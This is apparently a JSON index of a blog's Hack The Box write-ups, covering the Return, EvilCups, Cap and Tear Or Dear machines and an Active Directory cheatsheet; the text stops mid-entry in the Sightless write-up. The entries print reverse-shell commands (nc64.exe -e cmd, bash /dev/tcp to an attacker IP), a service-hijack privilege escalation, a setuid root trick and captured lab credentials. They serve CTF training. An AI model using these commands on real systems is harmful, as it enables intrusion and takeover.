[ { "title": "Hack The Box - Return", "url": "/posts/HTB-Return-Writeup/", "categories": "Hackthebox, Hackthebox-Win, Hackthebox-Easy", "tags": "AD, Active Directory, cracknmapexec, winrm, OSCP", "date": "2024-12-18 09:03:00 +0530", "snippet": "ReconNmapThe first thing that I do is run nmap scan that show this results:┌──(kali㉿kali)-[~/Desktop]└─$ nmap -sV -sC --min-rate=1000 -p- 10.10.11.108 -o nmap Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 02:39 ESTNmap scan report for 10.10.11.108Host is up (0.24s latency).Not shown: 65509 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: HTB Printer Admin Panel|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-18 07:59:03Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49671/tcp open msrpc Microsoft Windows RPC49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049677/tcp open msrpc Microsoft Windows RPC49681/tcp open msrpc Microsoft Windows RPC49688/tcp open msrpc Microsoft Windows RPC49699/tcp open msrpc Microsoft Windows RPC57825/tcp open msrpc Microsoft Windows RPCService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-12-18T08:00:05|_ start_date: N/A|_clock-skew: 18m33sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 154.44 secondsFrom the nmap results, we can see that there is port 80 which is a web service that running on the server and on port 445 is SMB.SMBTake a look in smb by using cracknmapexec┌──(kali㉿kali)-[~/htb/machine/ad/return]└─$ crackmapexec smb 10.10.11.108 --sharesSMB 10.10.11.108 445 PRINTER [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)SMB 10.10.11.108 445 PRINTER [-] Error enumerating shares: STATUS_USER_SESSION_DELETEDIt show a hostname PRINTER.return.local and need authen to show more.Website - TCP 80Take a look in the website, that is a link to connect to printerExploitUserThe printer admin will send ldap credential to printer to auth so i set up a nc listener and send it to my IP, and when send cred nc show user and password┌──(kali㉿kali)-[~/htb/machine/ad/return]└─$ nc -nvlp 389 listening on [any] 389 ...connect to [10.10.14.3] from (UNKNOWN) [10.10.11.108] 495940*`%return\\svc-printer� 1edFg43012!!Now, try smb with auth┌──(kali㉿kali)-[~/htb/machine/ad/return]└─$ crackmapexec smb 10.10.11.108 --shares -u svc-printer -p &#39;1edFg43012!!&#39;SMB 10.10.11.108 445 PRINTER [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)SMB 10.10.11.108 445 PRINTER [+] return.local\\svc-printer:1edFg43012!! SMB 10.10.11.108 445 PRINTER [+] Enumerated sharesSMB 10.10.11.108 445 PRINTER Share Permissions RemarkSMB 10.10.11.108 445 PRINTER ----- ----------- ------SMB 10.10.11.108 445 PRINTER ADMIN$ READ Remote AdminSMB 10.10.11.108 445 PRINTER C$ READ,WRITE Default shareSMB 10.10.11.108 445 PRINTER IPC$ READ Remote IPCSMB 10.10.11.108 445 PRINTER NETLOGON READ Logon server share SMB 10.10.11.108 445 PRINTER SYSVOL READ Logon server share And check with winrm and it pwn3d┌──(kali㉿kali)-[~/htb/machine/ad/return]└─$ crackmapexec winrm 10.10.11.108 -u svc-printer -p &#39;1edFg43012!!&#39;SMB 10.10.11.108 5985 PRINTER [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)HTTP 10.10.11.108 5985 PRINTER [*] http://10.10.11.108:5985/wsman/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0. arc4 = algorithms.ARC4(self._key)WINRM 10.10.11.108 5985 PRINTER [+] return.local\\svc-printer:1edFg43012!! (Pwn3d!)Connect by winrm and get user flag┌──(kali㉿kali)-[~/htb/machine/ad/return]└─$ evil-winrm -i 10.10.11.108 -u svc-printer -p &#39;1edFg43012!!&#39; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt;User flag: 19c79d3f4dbaf48bc1daa25220645fd2Privilege EscalationSee priv and groupFirst, see priv and group of user svc-printer*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&amp;gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= =================================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeSystemtimePrivilege Change the system time EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeRemoteShutdownPrivilege Force shutdown from a remote system EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone Enabled*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&amp;gt; whoami /groupsGROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ ============ ==================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Server Operators Alias S-1-5-32-549 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Print Operators Alias S-1-5-32-550 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288Pay attention to Server Operators group, this allow user to edit and control serviceA built-in group that exists only on domain controllers.By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Default User Rights: Allow log on locally: SeInteractiveLogonRight Back up files and directories: SeBackupPrivilege Change the system time: SeSystemTimePrivilege Change the time zone: SeTimeZonePrivilege Force shutdown from a remote system: SeRemoteShutdownPrivilege Restore files and directories SeRestorePrivilege Shut down the system: SeShutdownPrivilegeLike https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/, I get RCE nowEdit, stop and run reverse shell by nc*Evil-WinRM* PS C:\\prog&amp;gt; sc.exe config VSS binpath=&quot;C:\\windows\\system32\\cmd.exe /c C:\\prog\\nc64.exe -e cmd 10.10.14.3 443&quot;[SC] ChangeServiceConfig SUCCESS*Evil-WinRM* PS C:\\prog&amp;gt; sc.exe stop VSS[SC] ControlService FAILED 1062:The service has not been started.*Evil-WinRM* PS C:\\prog&amp;gt; sc.exe start VSSAnd use nc to listen reverse shell┌──(kali㉿kali)-[~/htb/machine/ad/return]└─$ nc -nvlp 443 listening on [any] 443 ...connect to [10.10.14.3] from (UNKNOWN) [10.10.11.108] 54619Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&amp;gt;And now, WE ARE ROOT !!Root flag: bfd83d73bbc30b65bcf1355c6a865bdeBox RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "AD-Cheatsheet", "url": "/posts/AD-Cheatsheet/", "categories": "Cheatsheet", "tags": "crackmapexec, winrm, AD, Active Directory, OSCP", "date": "2024-12-18 09:00:00 +0530", "snippet": "ReconScancrackmapexec Check smb sharecrackmapexec smb 10.10.11.108 --sharescrackmapexec smb 10.10.11.108 --shares -u svc-printer -p &#39;1edFg43012!!&#39; Check winrmcrackmapexec winrm 10.10.11.108 -u svc-printer -p &#39;1edFg43012!!&#39;ExploitWinRMevil-winrm -i 10.10.11.108 -u svc-printer -p &#39;1edFg43012!!&#39;Privilege EscalationSee privwhoami /privGroup privServer Operators Can edit and run serviceTham khảo: https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/PS C:\\prog&amp;gt; sc.exe config VSS binpath=&quot;C:\\windows\\system32\\cmd.exe /c C:\\prog\\nc64.exe -e cmd 10.10.14.3 443&quot;[SC] ChangeServiceConfig SUCCESSPS C:\\prog&amp;gt; sc.exe stop VSS[SC] ControlService FAILED 1062:The service has not been started.PS C:\\prog&amp;gt; sc.exe start VSSOther ToolsIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Tear Or Dear", "url": "/posts/HTB-TearOrDear-Writeup/", "categories": "Hackthebox, Hackthebox-Reverse, Hackthebox-Easy", "tags": "reverse, exe, dnspy", "date": "2024-11-13 09:03:00 +0530", "snippet": "SolutionThe first thing that I do is use file and string..NETFramework,Version=v4.5FrameworkDisplayName.NET Framework 4.53System.Resources.Tools.StronglyTypedResourceBuilder4.0.0.0KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGeneratorThat shows exe file write by C# use .NET Framework, so now i use dnspy to reverse it.DnSpyFirst, try to run exe fileIt check for username and password and in introduction of the challenge the flag have format HTB{username:password} so challenge is finding username and passwordRun in dnSpy and see that.The program start withnamespace TearORDear{ // Token: 0x02000003 RID: 3 internal static class Program { // Token: 0x06000014 RID: 20 RVA: 0x0000335D File Offset: 0x0000155D [STAThread] private static void Main() { Application.EnableVisualStyles(); Application.SetCompatibleTextRenderingDefault(false); Application.Run(new LoginForm()); } }}See in LoginForm that have button1_Click are check username and passwordprivate void button1_Click(object sender, EventArgs e){ this.label_Result.Text = &quot;&quot;; this.kapa(sender, e); this.pep = 0; this.aa = this.Multiply(this.encrypted1(this.textBox_user.Text).Substring(0, 5), -1); this.aa = this.aa.Remove(this.aa.Length - 1); string s = this.Multiply(this.oura, -9); if (this.username == this.o &amp;amp;&amp;amp; this.check1(s)) { MessageBox.Show(&quot;Correct!&quot;); return; } this.label_Result.Text = &quot;WRONG CREDENTIALS! Try Again...&quot;;}The username and password have 2 conditions including this.username == this.o and this.check1(s)Now, set debug in this line and run, see thatTry with username roiw!@# and set debug but the condition return false. So username is not roiw!@#, why.Now, see before the conditions, get attention to this.Multiply(this.encrypted1(this.textBox_user.Text).Substring(0, 5), -1);public string Multiply(string s, int n){ char[] array = s.ToCharArray(); Array.Reverse(array); this.username = this.textBox_pass.Text; return new string(array);}The username get from password :))) so the password is roiw!@#Now handle the second condition this.check1(s), it will return check2, check3, check4 and last return checkprivate bool check(string[] s1, string s2){ string[] array = new string[] { &quot;q&quot;, &quot;w&quot;, &quot;e&quot;, &quot;r&quot;, &quot;t&quot;, &quot;y&quot;, &quot;u&quot;, &quot;i&quot;, &quot;o&quot;, &quot;p&quot;, &quot;a&quot;, &quot;s&quot;, &quot;d&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;z&quot;, &quot;x&quot;, &quot;c&quot;, &quot;q&quot;, &quot;b&quot;, &quot;n&quot;, &quot;m&quot; }; array[3] + array[8] + array[7] + array[(int)Math.Sqrt(2.0)]; return this.textBox_user.Text == this.aa &amp;amp;&amp;amp; array[0] == array[22];}So set debug in this and we can see the username in this.aa is piphFlag: HTB{piph:roiw!@#}Box RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - EvilCups", "url": "/posts/HTB-EvilCups-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Medium", "tags": "nmap, cups, linpeas, OSCP", "date": "2024-11-13 09:03:00 +0530", "snippet": "ReconNmapThe first thing that I do is run nmap scan that show this results:# Nmap 7.94SVN scan initiated Thu Oct 31 03:16:36 2024 as: nmap -sV -sC --min-rate=1000 -p- -o nmap 10.10.11.40Warning: 10.10.11.40 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.11.40Host is up (0.27s latency).Not shown: 64302 closed tcp ports (conn-refused), 1231 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)| ssh-hostkey: | 256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)|_ 256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)631/tcp open ipp CUPS 2.4|_http-title: Home - CUPS 2.4.2| http-robots.txt: 1 disallowed entry |_/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Oct 31 03:19:48 2024 -- 1 IP address (1 host up) scanned in 191.98 secondsFrom the nmap results, we can see that there is port 22 SSH and port 631 TCP run CUPS 2.4.2 service. Take a search cups 2.4.2 and run nmap to scan udp port┌──(kali㉿kali)-[~/htb/machine/evilcups]└─$ sudo nmap -sU -p 630-632 10.10.11.40 -o nmap_udp[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 10:42 ESTNmap scan report for 10.10.11.40Host is up (0.25s latency).PORT STATE SERVICE630/udp closed rda631/udp open|filtered ipp632/udp closed bmppNmap done: 1 IP address (1 host up) scanned in 3.26 secondsThat’s port 631 UDP run ipp (Internet Printer Protocol)Website - TCP 631Take a look in the website, that is a web interface for CUPS 2.4.2 service to control openprinting printerExploitUserSearch for changelog and CVE in google for CUPS 2.4.2.I see that has 4 CVE: CVE-2024-47076 has a CVSS score of 8.6, representing a critical level of severity due to the ability of an attacker to send malicious IPP requests to manipulate printer settings and execute arbitrary code​ CVE-2024-47175 also scores 8.6, allowing for a similar type of remote code execution through crafted print job submissions, targeting vulnerabilities in the PPD file processing​ CVE-2024-47176 carries a CVSS score of 5.3, reflecting the potential for exploitation via the cups-browsed service CVE-2024-47177 is another critical vulnerability, also scoring 9.0 (previously 9.9), as it allows attackers to bypass security measures by sending malformed IPP requests​Combine this a report in github can get RCE from CUPS service in link https://github.com/OpenPrinting/cups-browsed in security tabUse it and change command to get reverse shell in port 9001 to “bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.14/9001 0&amp;gt;&amp;amp;1’”Run poc.py and access to printers in CUPS web and select to Print Test Page to get reverse shell and get user flagUser flag: ***Privilege EscalationLinpeasCome back to Web TCP 631 and see first Printer default in Web, i get that is printer with id 1 in this.So see in documention, get the default evilcups filesystem in var/spool/cups, but no read privilege in this, user lp just have execute privilege, and continue in documention default file name is d&amp;lt;print job&amp;gt;-&amp;lt;page number&amp;gt;, &amp;lt;print job&amp;gt; needs to be 5 digits and &amp;lt;page number&amp;gt; be 3 digits. So file-path is var/spool/cups/d00001-001.cat itcat /var/spool/cups/d00001-001%!PS-Adobe-3.0%%BoundingBox: 18 36 577 806%%Title: Enscript Output%%Creator: GNU Enscript 1.6.5.90%%CreationDate: Sat Sep 28 09:31:01 2024%%Orientation: Portrait%%Pages: (atend)%%DocumentMedia: A4 595 842 0 () ()%%DocumentNeededResources: (atend)%%EndComments%%BeginProlog%%BeginResource: procset Enscript-Prolog 1.6.5 90%% Procedures.%/_S { % save current state /_s save def} def/_R { % restore from saved state _s restore} def/S { % showpage protecting gstate gsave showpage grestore} bind def/MF { % fontname newfontname -&amp;gt; - make a new encoded font /newfontname exch def /fontname exch def...See that the file d00001-001 is ps file with DocumentMedia, so use tool ps2pdf to convert it to pdfp@evilcups:/$ ps2pdf /var/spool/cups/d00001-001 /tmp/d00001-001.pdfps2pdf /var/spool/cups/d00001-001 /tmp/d00001-001.pdflp@evilcups:/$ cd tmpcd tmplp@evilcups:/tmp$ lsls00d5e673a5af700d5e673c8b2700d7f673b957500d7f673f393000dc8673acbd900dc8673d3f54011d3673cb49e011d3674208c403f816736a89b03f816742929f06d266737c89006d26673a905e06d5a673600d7d00001-001.pdffoomatic-8Zd8lAfoomatic-dC088bfoomatic-Nyxp01foomatic-nzO5CZfoomatic-o7RpxIfoomatic-sJEqZSfoomatic-TGU0gWsystemd-private-6f705080b80545b0a6fb3d6cd199155b-colord.service-uvXVLMsystemd-private-6f705080b80545b0a6fb3d6cd199155b-systemd-logind.service-p3WmZdvmware-root_586-2696942867Run http server and get pdf fileSSH root with this password.And now, WE ARE ROOT !!Root flag: 2ff71ea6aba5d40af914c1af75672e2aBox RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Cap", "url": "/posts/HTB-Cap-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Easy", "tags": "nmap, gobuster, linpeas, python, wireshark, OSCP", "date": "2024-11-12 09:03:00 +0530", "snippet": "ReconNmapThe first thing that I do is run nmap scan that show this results:┌──(kali㉿kali)-[~/htb/machine/cap]└─$ nmap -sV -sC --min-rate=1000 -p- 10.10.10.245 -o nmapStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-12 09:51 ESTNmap scan report for 10.10.10.245Host is up (0.24s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn|_http-title: Security Dashboard| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND| Server: gunicorn| Date: Tue, 12 Nov 2024 14:52:50 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 232| &amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&amp;gt;| &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;| &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;| &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/p&amp;gt;| GetRequest: | HTTP/1.0 200 OK| Server: gunicorn| Date: Tue, 12 Nov 2024 14:52:44 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 19386| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt;Security Dashboard&amp;lt;/title&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&amp;gt;| &amp;lt;!-- amchar| HTTPOptions: | HTTP/1.0 200 OK| Server: gunicorn| Date: Tue, 12 Nov 2024 14:52:44 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Allow: GET, HEAD, OPTIONS| Content-Length: 0| RTSPRequest: | HTTP/1.1 400 Bad Request| Connection: close| Content-Type: text/html| Content-Length: 196| &amp;lt;html&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;title&amp;gt;Bad Request&amp;lt;/title&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;| Invalid HTTP Version &amp;amp;#x27;Invalid HTTP Version: &amp;amp;#x27;RTSP/1.0&amp;amp;#x27;&amp;amp;#x27;| &amp;lt;/body&amp;gt;|_ &amp;lt;/html&amp;gt;|_http-server-header: gunicorn1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.94SVN%I=7%D=11/12%Time=67336BBB%P=x86_64-pc-linux-gnu%r(SF:GetRequest,2F4C,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:SF:\\x20Tue,\\x2012\\x20Nov\\x202024\\x2014:52:44\\x20GMT\\r\\nConnection:\\x20closSF:e\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2SF:019386\\r\\n\\r\\n&amp;lt;!DOCTYPE\\x20html&amp;gt;\\n&amp;lt;html\\x20class=\\&quot;no-js\\&quot;\\x20lang=\\&quot;enSF:\\&quot;&amp;gt;\\n\\n&amp;lt;head&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;meta\\x20charset=\\&quot;utf-8\\&quot;&amp;gt;\\n\\x20\\x20\\x2SF:0\\x20&amp;lt;meta\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content=\\&quot;ie=edge\\&quot;&amp;gt;\\n\\SF:x20\\x20\\x20\\x20&amp;lt;title&amp;gt;Security\\x20Dashboard&amp;lt;/title&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;mSF:eta\\x20name=\\&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20initial-scSF:ale=1\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;shortcut\\x20icon\\&quot;\\x20type=\\&quot;iSF:mage/png\\&quot;\\x20href=\\&quot;/static/images/icon/favicon\\.ico\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\SF:x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;/static/css/bootstrap\\.min\\.csSF:s\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;/static/cssSF:/font-awesome\\.min\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;SF:\\x20href=\\&quot;/static/css/themify-icons\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20SF:rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;/static/css/metisMenu\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x2SF:0\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;/static/css/owl\\.carousel\\.mSF:in\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;/statSF:ic/css/slicknav\\.min\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;!--\\x20amchar&quot;)%r(HTTPOpSF:tions,B3,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20TueSF:,\\x2012\\x20Nov\\x202024\\x2014:52:44\\x20GMT\\r\\nConnection:\\x20close\\r\\nCoSF:ntent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20GET,\\x20HEAD,\\xSF:20OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\\.SF:1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20SF:text/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n&amp;lt;html&amp;gt;\\n\\x20\\x20&amp;lt;head&amp;gt;\\n\\x20SF:\\x20\\x20\\x20&amp;lt;title&amp;gt;Bad\\x20Request&amp;lt;/title&amp;gt;\\n\\x20\\x20&amp;lt;/head&amp;gt;\\n\\x20\\x20&amp;lt;boSF:dy&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad\\x20Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;\\n\\x20\\x20\\x20\\x20InSF:valid\\x20HTTP\\x20Version\\x20&amp;amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20&amp;amp;#x27;SF:RTSP/1\\.0&amp;amp;#x27;&amp;amp;#x27;\\n\\x20\\x20&amp;lt;/body&amp;gt;\\n&amp;lt;/html&amp;gt;\\n&quot;)%r(FourOhFourRequestSF:,189,&quot;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\SF:x20Tue,\\x2012\\x20Nov\\x202024\\x2014:52:50\\x20GMT\\r\\nConnection:\\x20closeSF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20SF:232\\r\\n\\r\\n&amp;lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\&quot;-//W3C//DTD\\x20HTML\\x203\\.2SF:\\x20Final//EN\\&quot;&amp;gt;\\n&amp;lt;title&amp;gt;404\\x20Not\\x20Found&amp;lt;/title&amp;gt;\\n&amp;lt;h1&amp;gt;Not\\x20Found&amp;lt;SF:/h1&amp;gt;\\n&amp;lt;p&amp;gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x2SF:0server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\xSF:20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.&amp;lt;/p&amp;gt;\\n&quot;);Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 226.45 secondsFrom the nmap results, we can see that there is port 80 which is a web service that running on the server and on port 22 is SSH and port 21 is FTP.Website - TCP 80Take a look in the website, that is a link to download pcap file and enable to IDOR in 10.10.10.245/data/&amp;lt;id&amp;gt;Take to download file from id 0 and use Wireshark to see the pcap file downloadedIn the pcap file from ID 0 see a username is nathan with password Buck3tH4TF0RM3!ExploitUserNow, try SSH with credentials minathanchael and password Buck3tH4TF0RM3!, oh well it’s success :)))User flag: 4ddf42b5d76fbebe51eeec3ce57df1aePrivilege EscalationLinpeasTo start, i upload linpeas.sh and run. Read the report, we will see some special execute file in /usr/bin/python3.8The /usr/bin/python3.8 is found to have cap_setuid and cap_net_bind_service , which isn’t the default setting.Read some doc relate to this, i found that CAP_SETUID allows the process to gain setuid privileges without the SUID bit set.So write some python code like thisimport osos.setuid(0)os.system(&quot;/bin/bash&quot;)And run this python with /usr/bin/python3.8/usr/bin/python3.8 poc.pyAnd now, WE ARE ROOT !!Root flag: 2ca0cd32ed3c0769783f3d9934b2ae46Box RootedIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Sightless", "url": "/posts/HTB-Sightless-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Easy", "tags": "nmap, gobuster, chrome-sandbox, hashcat, linpeas, CVE-2022-0944, OSCP", "date": "2024-10-28 09:03:00 +0530", "snippet": "ReconNmapThe first thing that I do is run nmap scan that show this results:┌──(kali㉿kali)-[~/htb/machine/sightless]└─$ cat nmap # Nmap 7.94SVN scan initiated Mon Oct 28 04:58:50 2024 as: nmap -sV -sC --min-rate=1000 -p- -o nmap 10.10.11.32Nmap scan report for 10.10.11.32Host is up (0.23s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp| fingerprint-strings: | 